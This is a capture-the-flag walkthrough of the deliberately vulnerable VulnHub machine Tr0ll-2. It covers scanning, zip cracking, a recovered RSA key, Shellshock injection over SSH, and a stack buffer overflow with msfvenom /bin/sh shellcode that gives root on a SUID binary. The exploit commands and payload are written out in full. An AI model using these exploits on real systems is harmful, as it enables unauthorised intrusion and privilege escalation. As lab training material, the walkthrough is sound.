# Tr0ll-2
[Link to vulnhub](https://www.vulnhub.com/entry/tr0ll-2,107/)

## Reconnaissance
I start with reconnaissance to find the target because it has been set to receive DHCP
```
nmap -sS -O 192.168.159.0/24
```
I found the target at **192.168.159.134**. Now I start enumerate services running on that host.

## Enumeration
```
root@AIRBUS:# nmap -A -T4 -p- 192.168.159.134

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-03-06 12:09 EST
Nmap scan report for 192.168.159.134
Host is up (0.00061s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:AA:18:28 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 192.168.159.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.39 seconds
```
From the result of Nmap, I found that the target was running 3 services
* FTP running on tcp port 21
* SSH running on tcp port 22
* HTTP running on tcp port 80

I use dirb to enumerate common paths
```
root@AIRBUS:# dirb http://192.168.159.134

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Mar  6 12:14:28 2017
URL_BASE: http://192.168.159.134/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.159.134/ ----
+ http://192.168.159.134/cgi-bin/ (CODE:403|SIZE:291)                                                                                                                                                                                    
+ http://192.168.159.134/index (CODE:200|SIZE:110)                                                                                                                                                                                       
+ http://192.168.159.134/index.html (CODE:200|SIZE:110)                                                                                                                                                                                  
+ http://192.168.159.134/robots (CODE:200|SIZE:346)                                                                                                                                                                                      
+ http://192.168.159.134/robots.txt (CODE:200|SIZE:346)                                                                                                                                                                                  
+ http://192.168.159.134/server-status (CODE:403|SIZE:296)                                                                                                                                                                               
                                                                                                                                                                                                                                         
-----------------
END_TIME: Mon Mar  6 12:14:31 2017
DOWNLOADED: 4612 - FOUND: 6
```
Check rotbots.txt
```
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```
I add all paths found in /robots.txt to dirb dictionary and dirb again.
```
root@AIRBUS:# dirb http://192.168.159.134 dirb_dic_from_robots.txt /usr/share/wordlists/dirb/common.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Mar  6 12:23:33 2017
URL_BASE: http://192.168.159.134/
WORDLIST_FILES: dirb_dic_from_robots.txt

-----------------

GENERATED WORDS: 21                                                            

---- Scanning URL: http://192.168.159.134/ ----
==> DIRECTORY: http://192.168.159.134/noob/                                                                                                                                                                                              
==> DIRECTORY: http://192.168.159.134/keep_trying/                                                                                                                                                                                       
==> DIRECTORY: http://192.168.159.134/dont_bother/                                                                                                                                                                                       
==> DIRECTORY: http://192.168.159.134/ok_this_is_it/                                                                                                                                                                                     
                                                                                                                                                                                                                                         
---- Entering directory: http://192.168.159.134/noob/ ----
                                                                                                                                                                                                                                         
---- Entering directory: http://192.168.159.134/keep_trying/ ----
                                                                                                                                                                                                                                         
---- Entering directory: http://192.168.159.134/dont_bother/ ----
                                                                                                                                                                                                                                         
---- Entering directory: http://192.168.159.134/ok_this_is_it/ ----
                                                                                                                                                                                                                                         
-----------------
END_TIME: Mon Mar  6 12:23:33 2017
DOWNLOADED: 105 - FOUND: 0
```
I found 4 directories but there are noting but an image and some comment in HTML code.
```html
<html>
<img src='cat_the_troll.jpg'>
<!--What did you really think to find here? Try Harder!>
</html>

```
For directories I found that it is an image has been imported to page named **cat_the_troll.jpg** then I download them all. At first I didn't notice any difference then I try to check MD5 sum of all jpg files.
```
root@AIRBUS:# md5sum *.jpg
f094e16de91dae231812a2fb382d8803  dont_bothercat_the_troll.jpg
8e40e4bf4212b317788de52381072cd8  keep_tryingcat_the_troll.jpg
8e40e4bf4212b317788de52381072cd8  noob-cat_the_troll.jpg
8e40e4bf4212b317788de52381072cd8  ok_this_is_itcat_the_troll.jpg
973c57fc28ca1ce8703bdaf102f80370  tr0ll_again.jpg
```
Cat_the_troll.jpg obtained from /dont_bother has different MD5 hash so take a look at it.
```
root@AIRBUS:# strings dont_bothercat_the_troll.jpg
...
snipped
...
Look Deep within y0ur_self for the answer
```

I browse to http://192.168.159.134/y0ur_self/ and found a file named answer.txt. It looks like a password file. But each password encoded with base64
```
http://192.168.159.134/y0ur_self/answer.txt
QQo=
QQo=
QUEK
QUIK
QUJNCg==
QUMK
QUNUSAo=
QUkK
QUlEUwo=
QU0K
QU9MCg==
QU9MCg==
QVNDSUkK
QVNMCg==
QVRNCg==
QVRQCg==
QVdPTAo=
QVoK
QVpUCg==
QWFjaGVuCg==
QWFsaXlhaAo=
QWFsaXlhaAo=
QWFyb24K
QWJiYXMK
QWJiYXNpZAo=
QWJib3R0Cg==
QWJib3R0Cg==
QWJieQo=
QWJieQo=
.
.
.
```
I have nothing to do with web servrice. I move on to FTP service.
```
root@AIRBUS:# ftp 192.168.159.134
Connected to 192.168.159.134.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.159.134:root): 
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> bye
221 Goodbye.
root@AIRBUS:# ftp 192.168.159.134
Connected to 192.168.159.134.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.159.134:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
It's easy to log in with **tr0ll** as user and password. I found a zip file and I pulled it down to my Kali but the zip file was protected by password.
```
-rw-r--r-- 1 root root   77438 Mar  7  2017 tr0ll_again.jpg
root@AIRBUS:# unzip lmao.zip 
Archive:  lmao.zip
[lmao.zip] noob password:
```

Let decode the answer.txt and use as dictionary to unzip the zip file
```
cat answer.txt | base64 --decode > decoded_answer.txt
root@AIRBUS:# fcrackzip -v -D -u -p decoded_answer.txt lmao.zip 
found file 'noob', (size cp/uc   1300/  1679, flags 9, chk 1005)


PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL
root@AIRBUS:# unzip lmao.zip 
Archive:  lmao.zip
[lmao.zip] noob password: 
  inflating: noob                    
root@AIRBUS:# ls -al
total 2408
drwxr-xr-x 2 root root    4096 Mar  6 14:44 .
drwxr-xr-x 4 root root    4096 Mar  6 11:53 ..
-rw-r--r-- 1 root root 1412653 Mar  7  2017 answer.txt
-rw-r--r-- 1 root root  886136 Mar  6 14:40 decoded_answer.txt
-rw-r--r-- 1 root root     302 Mar  6 12:22 dirb_dic_from_robots.txt
-rw-r--r-- 1 root root   15873 Mar  7  2017 dont_bothercat_the_troll.jpg
-rw-r--r-- 1 root root   15831 Mar  7  2017 keep_tryingcat_the_troll.jpg
-rw-r--r-- 1 root root    1474 Mar  6 14:37 lmao.zip
-rw------- 1 root root    1679 Oct  4  2014 noob
-rw-r--r-- 1 root root   15831 Mar  7  2017 noob-cat_the_troll.jpg
-rw-r--r-- 1 root root   15831 Mar  7  2017 ok_this_is_itcat_the_troll.jpg
-rw-r--r-- 1 root root   77438 Mar  7  2017 tr0ll_again.jpg
root@AIRBUS:# cat noob
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
root@AIRBUS:# 
```

The content seem to be a private key for something. I check with SSH service. Because file name is noob then I try to log on to SSH service with user noob and private key.
```
root@AIRBUS:# ssh -i noob noob@192.168.159.134
TRY HARDER LOL!
Connection to 192.168.159.134 closed.
```

## Exploit
I was able to log on but the connection was closed. Ahhhh I think for a while, Vulnhub release this vulnerable OS 24 October 2014. Around here there is a vulnerability that could able to bypass this [SHELLSHOCK](http://resources.infosecinstitute.com/practical-shellshock-exploitation-part-2/#gref).
```
root@AIRBUS:# ssh -i noob noob@192.168.159.134 '() { :;}; /bin/bash'
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```
Now I got a low priv shell. And I traverse into the host.
```
ls -al /
total 88
drwxr-xr-x 23 root root  4096 Oct  5  2014 .
drwxr-xr-x 23 root root  4096 Oct  5  2014 ..
drwxr-xr-x  2 root root  4096 Oct  4  2014 bin
drwxr-xr-x  3 root root  4096 Oct  3  2014 boot
drwxr-xr-x 14 root root  4260 Mar  6 22:06 dev
drwxr-xr-x 83 root root  4096 Mar  6 22:06 etc
drwxr-xr-x  5 root root  4096 Oct  3  2014 home
lrwxrwxrwx  1 root root    37 Oct  3  2014 initrd.img -> /boot/initrd.img-3.2.0-29-generic-pae
drwxr-xr-x 18 root root  4096 Oct  4  2014 lib
drwx------  2 root root 16384 Oct  3  2014 lost+found
drwxr-xr-x  4 root root  4096 Oct  3  2014 media
drwxr-xr-x  3 root root  4096 Oct  3  2014 mnt
drwsr-xr-x  3 root root  4096 Mar  7 01:00 nothing_to_see_here
drwxr-xr-x  2 root root  4096 Oct  3  2014 opt
dr-xr-xr-x 80 root root     0 Mar  6 22:05 proc
drwx------ 11 root root  4096 Oct 14  2014 root
drwxr-xr-x 16 root root   580 Mar  7 01:13 run
drwxr-xr-x  2 root root  4096 Oct  4  2014 sbin
drwxr-xr-x  2 root root  4096 Mar  5  2012 selinux
drwxr-xr-x  3 root root  4096 Oct  3  2014 srv
drwxr-xr-x 13 root root     0 Mar  6 22:05 sys
drwxrwxrwt  4 root root  4096 Mar  7 01:00 tmp
drwxr-xr-x 10 root root  4096 Oct  3  2014 usr
drwxr-xr-x 12 root root  4096 Oct 14  2014 var
lrwxrwxrwx  1 root root    33 Oct  3  2014 vmlinuz -> boot/vmlinuz-3.2.0-29-generic-pae
cd nothing_to_see_here
ls -al
total 12
drwsr-xr-x  3 root root 4096 Mar  7 01:15 .
drwxr-xr-x 23 root root 4096 Oct  5  2014 ..
drwsr-xr-x  5 root root 4096 Oct  4  2014 choose_wisely
cd choose_wisely
ls -al
total 20
drwsr-xr-x 5 root root 4096 Oct  4  2014 .
drwsr-xr-x 3 root root 4096 Mar  7 01:15 ..
drwsr-xr-x 2 root root 4096 Oct  4  2014 door1
drwsr-xr-x 2 root root 4096 Oct  5  2014 door2
drwsr-xr-x 2 root root 4096 Oct  5  2014 door3
ls -al *
door1:
total 16
drwsr-xr-x 2 root root 4096 Oct  4  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t

door2:
total 16
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t

door3:
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t
```

Now I found there are r00t binary file with **SUID bit** set. I think I have to exploit these binaries.
```
ssh -i noob noob@192.168.159.134 '() { :;}; /bin/bash'
cd /nothing_to_see_here/choose_wisely/door1
./r00t $(python -c 'print "A" * 1000')
cd /nothing_to_see_here/choose_wisely/door2
./r00t $(python -c 'print "A" * 1000')
cd /nothing_to_see_here/choose_wisely/door3
./r00t $(python -c 'print "A" * 1000')
```

I tried for many times and found that r00t in door3 is vulnerable to buffer overflow so I will exploit this.
```
root@AIRBUS:# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```
GDB on the target.
```
ssh -i noob noob@192.168.159.134 '() { :;}; /bin/bash'
cd /nothing_to_see_here/choose_wisely/door3
gdb -q ./r00t
Reading symbols from /nothing_to_see_here/choose_wisely/door2/r00t...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
Starting program: /nothing_to_see_here/choose_wisely/door2/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
(gdb) i r esp
esp            0xbffffab0       0xbffffab0
(gdb) 
```

Convert pattern to decimal buffer size
```
root@AIRBUS:# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6a413969
[*] Exact match at offset 268
```
Use msfpayload to create payload /bin/sh and escape null byte
```
root@AIRBUS:/kapi/vulnhub/tr0ll-2# msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of py file: 350 bytes
buf =  ""
buf += "\xd9\xee\xd9\x74\x24\xf4\x5f\xba\x2e\x56\xb2\x8d\x33"
buf += "\xc9\xb1\x0b\x31\x57\x1a\x03\x57\x1a\x83\xc7\x04\xe2"
buf += "\xdb\x3c\xb9\xd5\xba\x93\xdb\x8d\x91\x70\xad\xa9\x81"
buf += "\x59\xde\x5d\x51\xce\x0f\xfc\x38\x60\xd9\xe3\xe8\x94"
buf += "\xd1\xe3\x0c\x65\xcd\x81\x65\x0b\x3e\x35\x1d\xd3\x17"
buf += "\xea\x54\x32\x5a\x8c"
```

Write an exploit. (A*268)(offset of shell)(nop sled)(shellcode)
Even I found the position of esp was 0xbffffab0 but I could not use this offset as shell position. I have to shift plus or minut a little because when the binary was in debugging the memory was different.
```
root@AIRBUS:# ssh -i noob noob@192.168.159.134 '() { :;}; /bin/bash'
cd /nothing_to_see_here/choose_wisely/door3
./r00t $(python -c "print 'A' * 268 + '\x90\xfb\xff\xbf' + '\x90' * 100 + '\xd9\xee\xd9\x74\x24\xf4\x5f\xba\x2e\x56\xb2\x8d\x33\xc9\xb1\x0b\x31\x57\x1a\x03\x57\x1a\x83\xc7\x04\xe2\xdb\x3c\xb9\xd5\xba\x93\xdb\x8d\x91\x70\xad\xa9\x81\x59\xde\x5d\x51\xce\x0f\xfc\x38\x60\xd9\xe3\xe8\x94\xd1\xe3\x0c\x65\xcd\x81\x65\x0b\x3e\x35\x1d\xd3\x17\xea\x54\x32\x5a\x8c'")

id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
cd /root
ls
/bin/sh: 4: ls: Permission denied
dir
Proof.txt  core2  core4  hardmode  ran_dir.py
core1      core3  goal   lmao.zip  reboot
cat Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4  
```
Choosing door was tr0lling me.